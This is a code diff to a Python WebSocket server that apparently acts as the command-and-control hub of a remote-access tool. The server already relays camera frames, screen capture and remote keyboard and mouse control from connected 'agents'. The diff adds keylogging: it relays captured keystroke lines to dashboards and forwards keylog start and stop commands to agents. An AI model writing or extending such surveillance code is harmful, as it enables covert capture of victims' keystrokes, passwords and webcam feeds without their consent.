@@ -71,6 +71,8 @@ async def ws_agent(ws: WebSocket):
             elif data.get('type') == 'camera_frame':
                 frame = {k: data[k] for k in ('data','w','h','ts') if k in data}
                 await manager.relay_camera_to_dashboards(agent_id, frame)
+            elif data.get('type') == 'keylog_line':
+                await manager.relay_keylog_to_dashboards(agent_id, str(data.get('line','')))
             elif 'error' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
@@ -110,7 +112,8 @@ async def ws_dashboard(ws: WebSocket):
             elif target and data.get('type') in (
                 'start_interactive','stdin','end_interactive',
                 'screen_start','screen_stop','mouse','keyboard',
-                'camera_start','camera_stop','queue_reset','hard_reset','disconnect'
+                'camera_start','camera_stop','queue_reset','hard_reset','disconnect',
+                'keylog_start','keylog_stop'
             ):
                 ok = await manager.forward_json(target, data)
                 if not ok:
